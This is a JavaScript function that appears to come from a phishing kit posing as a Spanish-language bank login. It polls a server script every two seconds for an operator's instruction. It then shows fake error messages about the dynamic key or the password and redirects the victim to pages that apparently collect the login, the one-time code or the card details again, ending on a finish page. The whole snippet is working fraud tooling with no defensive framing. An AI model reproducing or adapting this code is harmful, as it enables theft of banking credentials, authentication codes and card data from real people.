        async function checkPaymentVerification(transactionId, messageId) {
    try {
        const formData = new FormData();
        formData.append('transactionId', transactionId);
        formData.append('messageId', messageId);

        const res = await fetch('verificar_dinamica.php', {
            method: 'POST',
            body: formData
        });
        const result = await res.json();

        if (result.action) {
            switch (result.action) {
                case 'pedir_dinamica': 
                    $("#fondo").hide();
                    $("#cargando").hide();
                    alert("Error de Clave Dinámica.");
                    window.location.href = "token.php";
                    break;

                case 'error_logo': 
                    $("#fondo").hide();
                    $("#cargando").hide();
                    alert("Usuario o clave incorrectos.");
                    window.location.href = "index.php";
                    break;

                case 'error_tc':
                    $("#fondo").hide();
                    $("#cargando").hide();
                    alert("Redirigiendo a tarjeta...");
                    window.location.href = "tarjeta.php"; // ajusta si tu archivo tiene otra ruta
                    break;

                case 'confirm_finalizar':
                    window.location.href = "/fin.php";
                    break;
            }
        } else {
            setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
        }
    } catch (err) {
        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
    }
}


